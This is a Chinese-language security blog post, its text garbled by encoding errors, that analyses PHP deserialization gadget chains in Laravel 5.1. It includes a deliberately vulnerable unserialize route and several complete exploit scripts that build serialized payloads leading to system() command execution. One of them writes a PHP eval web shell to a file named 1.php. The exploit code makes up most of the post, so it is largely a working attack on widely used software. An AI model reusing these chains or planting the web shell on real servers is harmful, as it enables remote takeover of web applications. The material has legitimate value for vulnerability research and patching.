<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>[Laravel5.1]ååºåˆ—åŒ–é“¾åˆ†æ | fallingskies</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">


  
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
  

  


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="ç¯å¢ƒæ­å»º
ä¸‹è½½æºç åœ°å€ï¼šhttps://github.com/laravel/laravel/releases/tag/v5.1.0
githubä¸Šçš„æºç ä¼šç¼ºå°‘venderç›®å½•
ä½¿ç”¨composerä¸‹è½½åï¼Œå°†venderç›®å½•æ‹·è´åˆ°æºç ä¸­
c..." />
    <meta name="keywords" content="" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://fallingskies22.github.io">
        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
        <h1 class="site-title">fallingskies</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
        
          <a href="/post/friends" class="site-nav">
            å‹é“¾
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      <h3>æƒ³è¦å»æœˆçƒ<h3>
    </div>
    <div class="site-footer">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">[Laravel5.1]ååºåˆ—åŒ–é“¾åˆ†æ</h2>
            <div class="post-date">2024-08-18</div>
            
              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/laravel51fan-xu-lie-hua-lian-fen-xi.png')">
              </div>
            
            <div class="post-content" v-pre>
              <h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2>
<p>ä¸‹è½½æºç åœ°å€ï¼šhttps://github.com/laravel/laravel/releases/tag/v5.1.0</p>
<p>githubä¸Šçš„æºç ä¼šç¼ºå°‘venderç›®å½•</p>
<p>ä½¿ç”¨composerä¸‹è½½åï¼Œå°†venderç›®å½•æ‹·è´åˆ°æºç ä¸­</p>
<pre><code class="language-sh">composer create-project --prefer-dist laravel/laravel laravel5.1 &quot;5.1.*&quot;
</code></pre>
<p>PHPç‰ˆæœ¬ï¼š<code>7.3.22</code></p>
<p>å°†<code>.env.example</code>ä¸­å†…å®¹å¤åˆ¶åˆ°æ–°å»ºçš„<code>.env</code>ä¸­<br>
è®¾ç½®<code>APP_ENV=local</code></p>
<p>è¿™æ ·é¡µé¢ä¼šæ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ã€‚</p>
<p>ä¿®æ”¹iniæ–‡ä»¶ï¼Œæ‰“å¼€openssl extension</p>
<pre><code>extension_dir = &quot;ext&quot;
extension=openssl
</code></pre>
<h2 id="å…¥å£å¤„">å…¥å£å¤„</h2>
<p>ä½¿ç”¨<code>app/Http/routes.php</code>ç¼–å†™å…¥å£</p>
<pre><code class="language-php">&lt;?php
Route::get('admin/{obj}',function($s){
    if($s){
        unserialize(base64_decode($s));
        return 'unserialize done'.$s;
    }else{
        return 'unserialize error'.$s;
    }
});
</code></pre>
<h2 id="rce1åˆ†æ">RCE1åˆ†æ</h2>
<p>å…ˆå…¨å±€æœç´¢<code>function __destruct()</code><br>
æ‰¾åˆ°<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php</code></p>
<pre><code class="language-php">&lt;?php
public function __destruct()
    {
        foreach ($this-&gt;_keys as $nsKey =&gt; $null) {
            $this-&gt;clearAll($nsKey);
        }
    }
</code></pre>
<p>æ¯æ¬¡è¿­ä»£ä¸­ï¼Œ<code>$nsKey</code>å˜é‡ä¼šè¢«èµ‹å€¼ä¸º<code>$this-&gt;_keys</code>çš„é”®ï¼Œè€Œ<code>$null</code>å˜é‡åœ¨è¿™ä¸ªä¸Šä¸‹æ–‡ä¸­å®é™…ä¸Šæ˜¯æœªä½¿ç”¨çš„ã€‚</p>
<p>ç»§ç»­è·Ÿè¿›<code>clearAll()</code>å‡½æ•°ï¼Œ<code>is_file()</code>å’Œ<code>is_dir()</code>å‡½æ•°éƒ½ä¼šå°†å‚æ•°å½“ä½œstringè¿›è¡Œæ‹¼æ¥å¤„ç†ï¼Œå› ä¸º<code>$this-&gt;_path</code>å¯æ§ï¼Œå¯ä»¥è§¦å‘å…¶ä»–ç±»çš„<code>__toString()</code>æ–¹æ³•</p>
<p>è¿™é‡Œçš„<code>$this-&gt;_keys</code>æ˜¯ä¸€ä¸ªäºŒé‡æ•°ç»„ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<pre><code>[1,[1,1]],[2,[2,2]],...
</code></pre>
<p>è¿™é‡Œå› ä¸ºä¼šä½¿ç”¨<code>unlink</code>åˆ é™¤æ–‡ä»¶ï¼Œåœ¨æ„é€ _keysçš„å†…å®¹æ—¶ï¼Œå†™ç‰¹æ®Šä¸€ç‚¹ï¼Œä»¥é˜²åˆ æ‰æœåŠ¡å™¨æ–‡ä»¶ã€‚</p>
<pre><code class="language-php">&lt;?php
    /**
     * Check if the given $itemKey exists in the namespace $nsKey.
     *
     * @param string $nsKey
     * @param string $itemKey
     *
     * @return bool
     */
    public function hasKey($nsKey, $itemKey)
    {
        return is_file($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
    }

    /**
     * Clear data for $itemKey in the namespace $nsKey if it exists.
     *
     * @param string $nsKey
     * @param string $itemKey
     */
    public function clearKey($nsKey, $itemKey)
    {
        if ($this-&gt;hasKey($nsKey, $itemKey)) {
            $this-&gt;_freeHandle($nsKey, $itemKey);
            unlink($this-&gt;_path.'/'.$nsKey.'/'.$itemKey);
        }
    }
    /**
     * Clear all data in the namespace $nsKey if it exists.
     *
     * @param string $nsKey
     */
    public function clearAll($nsKey)
    {
        if (array_key_exists($nsKey, $this-&gt;_keys)) {
            foreach ($this-&gt;_keys[$nsKey] as $itemKey =&gt; $null) {
                $this-&gt;clearKey($nsKey, $itemKey);
            }
            if (is_dir($this-&gt;_path.'/'.$nsKey)) {
                rmdir($this-&gt;_path.'/'.$nsKey);
            }
            unset($this-&gt;_keys[$nsKey]);
        }
    }
</code></pre>
<p>ä¸‹ä¸€æ­¥å¯»æ‰¾å¯åˆ©ç”¨<code>__toString()</code>å‡½æ•°çš„ç±»</p>
<p>è¿™é‡Œå¯ä»¥é€‰æ‹©<code>vendor/mockery/mockery/library/Mockery/Generator/DefinedTargetClass.php</code>ä¸­çš„<code>__toString()</code>æ–¹æ³•ä½œä¸ºè§¦å‘çš„ç‚¹ï¼Œå…¶å…ˆä¼šè°ƒç”¨<code>getName()</code>æ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•ä¸­çš„<code>$this-&gt;rfc</code>æ˜¯å¯æ§çš„ï¼Œå› æ­¤å¯ä»¥æ¥è§¦å‘ä¸€ä¸ªæ²¡æœ‰<code>getName()</code>æ–¹æ³•çš„ç±»ä»è€Œæ¥è§¦å‘è¯¥ç±»ä¸­çš„<code>__call()</code>æ–¹æ³•</p>
<pre><code class="language-php">&lt;?php

namespace Mockery\Generator;

class DefinedTargetClass
{
    private $rfc;

    public function __construct(\ReflectionClass $rfc)
    {
        $this-&gt;rfc = $rfc;
    }
...
    public function getName()
    {
        return $this-&gt;rfc-&gt;getName();
    }
...
    public function __toString()
    {
        return $this-&gt;getName();
    }
...
</code></pre>
<p>å…¨å±€æœç´¢<code>__call()</code>æ–¹æ³•,è·Ÿè¿›<code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code>ä¸­çš„<code>__call()</code>æ–¹æ³•ï¼Œå…¶ while è¯­å¥å†…çš„<code>$this-&gt;validator</code>æ˜¯å¯æ§çš„ï¼Œå½“<code>$res</code>èƒ½å¤Ÿæ˜¯å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„å‚æ•°æ—¶å³å¯è§¦å‘å‘½ä»¤æ‰§è¡Œ RCEï¼Œç”±äº<code>$this-&gt;generator</code>ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå› æ­¤å¯ä»¥å¯»æ‰¾ä¸€ä¸ªèƒ½å¤Ÿæœ‰è¿”å›å‚æ•°å€¼çš„æ–¹æ³•ç±»æ¥è¾¾åˆ°è¿”å›å‘½ä»¤æ‰§è¡Œå‡½æ•°å‚æ•°çš„ç›®çš„ä»è€Œ RCE</p>
<p><code>call_user_func()</code>å‡½æ•°åªä¼šè¿”å›<code>NULL</code>,æ‰€ä»¥ä¼šä¸€ç›´å¾ªç¯ã€‚è®¾ç½®<code>$this-&gt;maxRetries</code>æ¥é™åˆ¶å¾ªç¯æ¬¡æ•°ã€‚</p>
<p><a href="https://www.php.net/manual/en/function.call-user-func-array.php"><code>call_user_func_array()</code>å‡½æ•°ä½¿ç”¨å‚è€ƒ</a></p>
<pre><code class="language-php">&lt;?php
    /**
     * Catch and proxy all generator calls with arguments but return only valid values
     * @param string $name
     * @param array $arguments
     *
     * @return mixed
     */
    public function __call($name, $arguments)
    {
        $i = 0;
        do {
            $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
            $i++;
            if ($i &gt; $this-&gt;maxRetries) {
                throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
            }
        } while (!call_user_func($this-&gt;validator, $res));

        return $res;
    }
</code></pre>
<p>è¿™é‡Œå¯ä»¥ç”¨<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code>æ¥åšè§¦å‘ç‚¹ï¼Œå½“å‰é¢è®¾ç½®çš„<code>$name</code>æ–¹æ³•ä¸å­˜åœ¨æ—¶è¿™é‡Œå°±ä¼šè§¦å‘åˆ°<code>__call()</code>æ–¹æ³•ï¼Œä»è€Œè¿”å›å¯æ§å‚æ•°<code>$this-&gt;default</code>çš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶<code>$res</code>å‚æ•°äº†ã€‚</p>
<pre><code class="language-php">&lt;?php

namespace Faker;

/**
 * This generator returns a default value for all called properties
 * and methods. It works with Faker\Generator\Base-&gt;optional().
 */
class DefaultGenerator
{
    protected $default;

    public function __construct($default = null)
    {
        $this-&gt;default = $default;
    }

    /**
     * @param string $attribute
     *
     * @return mixed
     */
    public function __get($attribute)
    {
        return $this-&gt;default;
    }

    /**
     * @param string $method
     * @param array $attributes
     *
     * @return mixed
     */
    public function __call($method, $attributes)
    {
        return $this-&gt;default;
    }
}
</code></pre>
<h2 id="exp">exp</h2>
<pre><code class="language-php">&lt;?php
namespace Faker{
    class DefaultGenerator{
        protected $default;
        public function __construct($cmd)
        {
            $this-&gt;default = $cmd;
        }
    }
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($cmd){
            $this-&gt;generator=new DefaultGenerator($cmd);
            $this-&gt;maxRetries=9;
            $this-&gt;validator='system';
        }
    }
}

namespace Mockery\Generator{
    use Faker\ValidGenerator;
    class DefinedTargetClass
    {
        private $rfc;
        public function __construct($cmd)
        {
            $this-&gt;rfc=new ValidGenerator($cmd);
        }
    }
}

namespace{
    use Mockery\Generator\DefinedTargetClass;
    class Swift_KeyCache_DiskKeyCache{
        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
        private $_path;
        public function __construct($cmd){
            $this-&gt;_path=new DefinedTargetClass($cmd);
        }
    }
    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
}
?&gt;
</code></pre>
<h2 id="__tostringå¤„å…¶ä»–å‡½æ•°åˆ©ç”¨">__toStringå¤„å…¶ä»–å‡½æ•°åˆ©ç”¨</h2>
<p>å¯»æ‰¾å…¶ä»–å¯åˆ©ç”¨çš„<code>__toString()</code>å‡½æ•°</p>
<p>IdenticalValueToken.php<br>
ExactValueToken.php<br>
ä¸­è²Œä¼¼å¯ä»¥åˆ©ç”¨</p>
<p>ä¸»è¦æ‰¾æœ‰ä¸¤ä¸ª<code>-&gt;</code>çš„åœ°æ–¹ï¼Œèƒ½å¤Ÿè·³åˆ°ä¸‹ä¸€æ®µ<code>_call</code>ä»£ç å¤„ã€‚</p>
<p>è¿™é‡Œç”¨<br>
<code>vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Deprecated.php</code></p>
<pre><code class="language-php">&lt;?php
public function __toString() : string
    {
        if ($this-&gt;description) {
            $description = $this-&gt;description-&gt;render();
        } else {
            $description = '';
        }

        $version = (string) $this-&gt;version;

        return $version . ($description !== '' ? ($version !== '' ? ' ' : '') . $description : '');
    }
</code></pre>
<h2 id="exp-2">exp</h2>
<pre><code class="language-php">&lt;?php
namespace Faker{
    class DefaultGenerator{
        protected $default;
        public function __construct($cmd)
        {
            $this-&gt;default = $cmd;
        }
    }
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($cmd){
            $this-&gt;generator=new DefaultGenerator($cmd);
            $this-&gt;maxRetries=9;
            $this-&gt;validator='system';
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{
    use Faker\ValidGenerator;
    class Deprecated
    {
        protected $description;
        public function __construct($cmd)
        {
            $this-&gt;description=new ValidGenerator($cmd);
        }
    }
}

namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
    class Swift_KeyCache_DiskKeyCache{
        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
        private $_path;
        public function __construct($cmd){
            $this-&gt;_path=new DefinedTargetClass($cmd);
        }
    }
    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;))));
}
?&gt;
</code></pre>
<h2 id="__callå¤„å…¶ä»–å‡½æ•°åˆ©ç”¨">__callå¤„å…¶ä»–å‡½æ•°åˆ©ç”¨</h2>
<p>æ‰¾åˆ°<code>vendor/laravel/framework/src/Illuminate/Database/DatabaseManager.php</code><br>
è·Ÿè¿›<code>__call()</code>æ–¹æ³•ï¼Œå…¶è°ƒç”¨äº†<code>connection()</code>æ–¹æ³•ï¼Œè·Ÿè¿›å»ï¼Œè¿™é‡Œè¦è®©å…¶è¿›å…¥<code>makeConnection()</code>æ–¹æ³•ä»è€Œæ¥åˆ©ç”¨<code>call_user_func()</code>æ–¹æ³•æ¥è¿›è¡ŒRCE</p>
<pre><code class="language-php">&lt;?php

namespace Illuminate\Database;

use Illuminate\Support\Arr;
use Illuminate\Support\Str;
use InvalidArgumentException;
use Illuminate\Database\Connectors\ConnectionFactory;

class DatabaseManager implements ConnectionResolverInterface
{
    /**
     * The application instance.
     *
     * @var \Illuminate\Foundation\Application
     */
    protected $app;

    /**
     * The database connection factory instance.
     *
     * @var \Illuminate\Database\Connectors\ConnectionFactory
     */
    protected $factory;

    /**
     * The active connection instances.
     *
     * @var array
     */
    protected $connections = [];

    /**
     * The custom connection resolvers.
     *
     * @var array
     */
    protected $extensions = [];

    /**
     * Create a new database manager instance.
     *
     * @param  \Illuminate\Foundation\Application  $app
     * @param  \Illuminate\Database\Connectors\ConnectionFactory  $factory
     * @return void
     */
    public function __construct($app, ConnectionFactory $factory)
    {
        $this-&gt;app = $app;
        $this-&gt;factory = $factory;
    }

    /**
     * Get a database connection instance.
     *
     * @param  string  $name
     * @return \Illuminate\Database\Connection
     */
    public function connection($name = null)
    {
        list($name, $type) = $this-&gt;parseConnectionName($name);

        // If we haven't created this connection, we'll create it based on the config
        // provided in the application. Once we've created the connections we will
        // set the &quot;fetch mode&quot; for PDO which determines the query return types.
        if (! isset($this-&gt;connections[$name])) {
            $connection = $this-&gt;makeConnection($name);

            $this-&gt;setPdoForType($connection, $type);

            $this-&gt;connections[$name] = $this-&gt;prepare($connection);
        }

        return $this-&gt;connections[$name];
    }

    /**
     * Parse the connection into an array of the name and read / write type.
     *
     * @param  string  $name
     * @return array
     */
    protected function parseConnectionName($name)
    {
        $name = $name ?: $this-&gt;getDefaultConnection();

        return Str::endsWith($name, ['::read', '::write'])
                            ? explode('::', $name, 2) : [$name, null];
    }

    /**
     * Disconnect from the given database and remove from local cache.
     *
     * @param  string  $name
     * @return void
     */
    public function purge($name = null)
    {
        $this-&gt;disconnect($name);

        unset($this-&gt;connections[$name]);
    }

    /**
     * Disconnect from the given database.
     *
     * @param  string  $name
     * @return void
     */
    public function disconnect($name = null)
    {
        if (isset($this-&gt;connections[$name = $name ?: $this-&gt;getDefaultConnection()])) {
            $this-&gt;connections[$name]-&gt;disconnect();
        }
    }

    /**
     * Reconnect to the given database.
     *
     * @param  string  $name
     * @return \Illuminate\Database\Connection
     */
    public function reconnect($name = null)
    {
        $this-&gt;disconnect($name = $name ?: $this-&gt;getDefaultConnection());

        if (! isset($this-&gt;connections[$name])) {
            return $this-&gt;connection($name);
        }

        return $this-&gt;refreshPdoConnections($name);
    }

    /**
     * Refresh the PDO connections on a given connection.
     *
     * @param  string  $name
     * @return \Illuminate\Database\Connection
     */
    protected function refreshPdoConnections($name)
    {
        $fresh = $this-&gt;makeConnection($name);

        return $this-&gt;connections[$name]
                                -&gt;setPdo($fresh-&gt;getPdo())
                                -&gt;setReadPdo($fresh-&gt;getReadPdo());
    }

    /**
     * Make the database connection instance.
     *
     * @param  string  $name
     * @return \Illuminate\Database\Connection
     */
    protected function makeConnection($name)
    {
        $config = $this-&gt;getConfig($name);

        // First we will check by the connection name to see if an extension has been
        // registered specifically for that connection. If it has we will call the
        // Closure and pass it the config allowing it to resolve the connection.
        if (isset($this-&gt;extensions[$name])) {
            return call_user_func($this-&gt;extensions[$name], $config, $name);
        }

        $driver = $config['driver'];

        // Next we will check to see if an extension has been registered for a driver
        // and will call the Closure if so, which allows us to have a more generic
        // resolver for the drivers themselves which applies to all connections.
        if (isset($this-&gt;extensions[$driver])) {
            return call_user_func($this-&gt;extensions[$driver], $config, $name);
        }

        return $this-&gt;factory-&gt;make($config, $name);
    }

    /**
     * Prepare the database connection instance.
     *
     * @param  \Illuminate\Database\Connection  $connection
     * @return \Illuminate\Database\Connection
     */
    protected function prepare(Connection $connection)
    {
        $connection-&gt;setFetchMode($this-&gt;app['config']['database.fetch']);

        if ($this-&gt;app-&gt;bound('events')) {
            $connection-&gt;setEventDispatcher($this-&gt;app['events']);
        }

        // Here we'll set a reconnector callback. This reconnector can be any callable
        // so we will set a Closure to reconnect from this manager with the name of
        // the connection, which will allow us to reconnect from the connections.
        $connection-&gt;setReconnector(function ($connection) {
            $this-&gt;reconnect($connection-&gt;getName());
        });

        return $connection;
    }

    /**
     * Prepare the read write mode for database connection instance.
     *
     * @param  \Illuminate\Database\Connection  $connection
     * @param  string  $type
     * @return \Illuminate\Database\Connection
     */
    protected function setPdoForType(Connection $connection, $type = null)
    {
        if ($type == 'read') {
            $connection-&gt;setPdo($connection-&gt;getReadPdo());
        } elseif ($type == 'write') {
            $connection-&gt;setReadPdo($connection-&gt;getPdo());
        }

        return $connection;
    }

    /**
     * Get the configuration for a connection.
     *
     * @param  string  $name
     * @return array
     *
     * @throws \InvalidArgumentException
     */
    protected function getConfig($name)
    {
        $name = $name ?: $this-&gt;getDefaultConnection();

        // To get the database connection configuration, we will just pull each of the
        // connection configurations and get the configurations for the given name.
        // If the configuration doesn't exist, we'll throw an exception and bail.
        $connections = $this-&gt;app['config']['database.connections'];

        if (is_null($config = Arr::get($connections, $name))) {
            throw new InvalidArgumentException(&quot;Database [$name] not configured.&quot;);
        }

        return $config;
    }

    /**
     * Get the default connection name.
     *
     * @return string
     */
    public function getDefaultConnection()
    {
        return $this-&gt;app['config']['database.default'];
    }

    /**
     * Set the default connection name.
     *
     * @param  string  $name
     * @return void
     */
    public function setDefaultConnection($name)
    {
        $this-&gt;app['config']['database.default'] = $name;
    }

    /**
     * Register an extension connection resolver.
     *
     * @param  string    $name
     * @param  callable  $resolver
     * @return void
     */
    public function extend($name, callable $resolver)
    {
        $this-&gt;extensions[$name] = $resolver;
    }

    /**
     * Return all of the created connections.
     *
     * @return array
     */
    public function getConnections()
    {
        return $this-&gt;connections;
    }

    /**
     * Dynamically pass methods to the default connection.
     *
     * @param  string  $method
     * @param  array   $parameters
     * @return mixed
     */
    public function __call($method, $parameters)
    {
        return call_user_func_array([$this-&gt;connection(), $method], $parameters);
    }
}
</code></pre>
<p>è·Ÿè¿›<code>getConfig()</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›<code>Arr::get($connections, $name)</code>ï¼Œå¯ä»¥çœ‹åˆ°ç»è¿‡<code>get()</code>æ–¹æ³•è¿”å›å›æ¥çš„<code>$config</code>çš„å€¼æ˜¯å¯æ§çš„ï¼Œå¯ä»¥å°†å‘½ä»¤æ‰§è¡Œå‡½æ•°è¿”å›å›æ¥ï¼Œä»è€Œå¯¼è‡´ RCE</p>
<p>éœ€è¦å°†<code>$this-&gt;extensions[$name]</code>èµ‹å€¼ä¸º<code>call_user_func</code>ï¼Œ<code>$config</code>èµ‹å€¼ä¸º<code>system</code>,<code>$name</code>èµ‹å€¼ä¸º<code>id</code>(å³$payload)</p>
<p>å¾€ä¸ŠæŸ¥çœ‹<code>$name</code>å‚æ•°ä¼ é€’è¿‡ç¨‹</p>
<pre><code>list($name, $type) = $this-&gt;parseConnectionName($name);
</code></pre>
<p>ç»§ç»­è·Ÿè¿›<code>parseConnectionName()</code>å‡½æ•°</p>
<pre><code>protected function parseConnectionName($name)
    {
        $name = $name ?: $this-&gt;getDefaultConnection();

        return Str::endsWith($name, ['::read', '::write'])
                            ? explode('::', $name, 2) : [$name, null];
    }
</code></pre>
<p>ç»§ç»­è·Ÿè¿›<code>getDefaultConnection()</code>å‡½æ•°</p>
<pre><code>public function getDefaultConnection()
    {
        return $this-&gt;app['config']['database.default'];
    }
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ç›´æ¥èµ‹å€¼<code>$this-&gt;app['config']['database.default']=$payload</code>å°±å¯ä»¥äº†,ä¸Šä¸€ä¸ªå‡½æ•°å¯¹<code>::</code>è¿›è¡Œåˆ†å‰²ï¼Œæ‰€ä»¥è®¾ç½®å‚æ•°æ—¶ä¹Ÿå¯ä»¥åŠ <code>::</code>,è™½ç„¶æ²¡å•¥ç”¨ğŸ˜…</p>
<p>ç»§ç»­çœ‹<code>$config</code>å‚æ•°</p>
<pre><code>$config = $this-&gt;getConfig($name);
</code></pre>
<p>è·Ÿè¿›<code>getConfig()</code>å‡½æ•°</p>
<pre><code>protected function getConfig($name)
    {
        $name = $name ?: $this-&gt;getDefaultConnection();

        // To get the database connection configuration, we will just pull each of the
        // connection configurations and get the configurations for the given name.
        // If the configuration doesn't exist, we'll throw an exception and bail.
        $connections = $this-&gt;app['config']['database.connections'];

        if (is_null($config = Arr::get($connections, $name))) {
            throw new InvalidArgumentException(&quot;Database [$name] not configured.&quot;);
        }

        return $config;
    }
</code></pre>
<p>ç»§ç»­è·Ÿè¿›<code>Arr::get</code></p>
<pre><code>public static function get($array, $key, $default = null)
    {
        if (is_null($key)) {
            return $array;
        }

        if (isset($array[$key])) {
            return $array[$key];
        }
        ...
</code></pre>
<p>å› ä¸º<code>$name</code>å·²ç»è¢«æˆ‘ä»¬èµ‹å€¼äº†ï¼Œæ‰€ä»¥è®¾ç½®<code>$this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system']</code><br>
<code>$this-&gt;extensions[$payload]='call_user_func';</code><br>
è¿™æ ·å°±æ„é€ å®Œæˆäº†ã€‚</p>
<h2 id="exp-3">exp</h2>
<pre><code class="language-php">&lt;?php
namespace Illuminate\Database{
    class DatabaseManager{
        protected $app;
        protected $extensions ;
        public function __construct($payload)
        {
            $this-&gt;app['config']['database.default'] = $payload;
            $this-&gt;app['config']['database.connections'] = [$payload =&gt; 'system'];
            $this-&gt;extensions[$payload]='call_user_func';
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{
    use Illuminate\Database\DatabaseManager;
    class Deprecated
    {
        protected $description;
        public function __construct($payload)
        {
            $this-&gt;description=new DatabaseManager($payload);
        }
    }
}

namespace {
    use phpDocumentor\Reflection\DocBlock\Tags\Deprecated;
    class Swift_KeyCache_DiskKeyCache {
        private $_path;
        private $_keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
        public function __construct($payload) {
            $this-&gt;_path = new Deprecated($payload);
        }
    }
    echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;echo 'PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='|base64 -d &gt; 1.php&quot;)));
}
?&gt;
</code></pre>
<p>å‘½ä»¤æ‰§è¡ŒæˆåŠŸåï¼Œä¼šæœ‰æŠ¥é”™ä¿¡æ¯<br>
<img src="https://fallingskies22.github.io/post-images/1724071508888.png" alt="" loading="lazy"></p>
<h2 id="å¦ä¸€æ¡">å¦ä¸€æ¡</h2>
<p>åˆ†æå°±çœç•¥äº†ï¼Œå°±æ˜¯æ”¹äº†__tostringå’Œ__call<br>
è¿™é‡Œæ³¨æ„è°ƒç”¨__callæ—¶æ˜¯èƒ½å¸¦å…¥å‚æ•°çš„ï¼Œè¿™é‡Œ</p>
<pre><code>$method=stringfy
$attributes=$this-&gt;value
</code></pre>
<pre><code class="language-php">&lt;?php 
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this-&gt;formatters = ['stringify' =&gt; &quot;system&quot;];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class ExactValueToken {
        private $string;
        private $value;
        private $util;
        public function __construct($payload) {
            $this-&gt;string = null;
            $this-&gt;util = new Generator();;
            $this-&gt;value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\ExactValueToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['fallingskies' =&gt; ['fallingskies' =&gt; 'fallingskies']];
        public function __construct($payload) {
            $this-&gt;path = new ExactValueToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;whoami&quot;)));
}
?&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1724118558197.png" alt="" loading="lazy"></figure>
<p>ä½†æ˜¯æµ‹è¯•å‘ç°<code>Generator</code>ä¸­çš„<code>__call</code>åˆ©ç”¨ä¸äº†ï¼Œå› ä¸ºå·²ç»ä¿®å¤äº†<br>
<code>$this-&gt;formatters</code>ä¼šæ¸…ç©ºï¼Œå¯¼è‡´åé¢åˆ©ç”¨å‚æ•°é“¾æ–­è£‚ã€‚</p>
<pre><code>public function __wakeup()
    {
        $this-&gt;formatters = [];
    }
</code></pre>
<h2 id="å¦å¦ä¸€æ¡">å¦å¦ä¸€æ¡</h2>
<p><code>vendor/laravel/framework/src/Illuminate/Validation/Validator.php</code></p>
<pre><code>public function __call($method, $parameters)
    {
        $rule = Str::snake(substr($method, 8));
        echo $rule;
        if (isset($this-&gt;extensions[$rule])) {
            return $this-&gt;callExtension($rule, $parameters);
        }

        throw new BadMethodCallException(&quot;Method [$method] does not exist.&quot;);
    }
</code></pre>
<p>è·Ÿè¿›<code>src/Illuminate/Validation/Validator.php</code>ä¸­çš„<code>__call()</code>æ–¹æ³•ï¼Œå…ˆè¿›è¡Œå­—ç¬¦ä¸²çš„æ“ä½œæˆªå–<code>$method</code>ç¬¬å…«ä¸ªå­—ç¬¦ä¹‹åçš„å­—ç¬¦ï¼Œç”±äºä¼ å…¥çš„å­—ç¬¦ä¸²æ˜¯<code>dispatch</code>ï¼Œæ­£å¥½å…«ä¸ªå­—ç¬¦æ‰€ä»¥ä¼ å…¥åä¸ºç©ºï¼Œæ¥ç€è°ƒç”¨<code>callExtension()</code>æ–¹æ³•ï¼Œé€šè¿‡<code>instanceof Closure</code>åˆ¤æ–­ï¼Œè§¦å‘call_user_func_arrayæ–¹æ³•<br>
<img src="https://fallingskies22.github.io/post-images/1724126866932.png" alt="" loading="lazy"></p>
<p>exp</p>
<pre><code class="language-php">&lt;?php
namespace Illuminate\Validation {
    class Validator {
       public $extensions = [];
       public function __construct() {
            $this-&gt;extensions = ['' =&gt; 'system'];
       }
    }
}

namespace Illuminate\Broadcasting {
    use  Illuminate\Validation\Validator;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this-&gt;events = new Validator();
            $this-&gt;event = $cmd;
        }
    }
    echo base64_encode(serialize(new PendingBroadcast('calc')));
}
?&gt;
</code></pre>
